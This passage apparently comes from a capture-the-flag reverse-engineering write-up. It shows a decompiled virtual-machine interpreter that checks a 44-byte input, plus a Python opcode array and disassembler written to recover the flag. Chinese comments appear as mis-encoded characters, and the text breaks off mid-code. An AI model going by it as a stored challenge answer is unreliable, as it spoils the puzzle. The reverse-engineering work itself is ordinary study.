reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xFE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, reg[<span class="number">1</span>]);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( reg[<span class="number">1</span>] != <span class="number">1877735783</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, s, <span class="number">0x2C</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">44</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">0</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fog[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)] = reg[<span class="number">1</span>];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = (<span class="type">unsigned</span> __int8)s[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">0</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">1</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)*(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>) != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè½¬æ¢å†™å‡ºæ¥å°±å¥½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">flagafter = []</span><br><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line"></span><br><span class="line">exit_door = [<span class="number">0xCF1304DC</span>, <span class="number">0x283B8E84</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = [<span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDD</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0xB9</span>, <span class="number">0xE4</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0xC1</span>, <span class="number">0x24</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC7</span>, <span class="number">0xC1</span>, <span class="number">0x28</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2A</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC8</span>, <span class="number">0x99</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_asm</span>(<span class="params">reg</span>):<span class="comment"># è¿™é‡Œå†™æˆpythonè¯­æ³•æ–¹ä¾¿çˆ†ç ´</span></span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        opcode = reg[now]</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">113</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;push <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">2</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">3</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">4</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">65</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1+=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">66</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1-=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">67</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1*=reg3&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">55</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">56</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">57</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg5=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xF7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9+=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">68</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1/=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x80</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>= <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(reg[now + <span class="number">2</span>:now + <span class="number">6</span>]), <span class="string">&#x27;little&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">6</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x77</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;pop [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x22</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&gt;&gt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x23</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&lt;&lt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x99</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x76</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r3 = [r6]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[r6] = 0&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r6 += 4&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x54</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1|=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x31</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&amp;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;r3 = <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=1877735783&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x10</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x33</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg4=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span 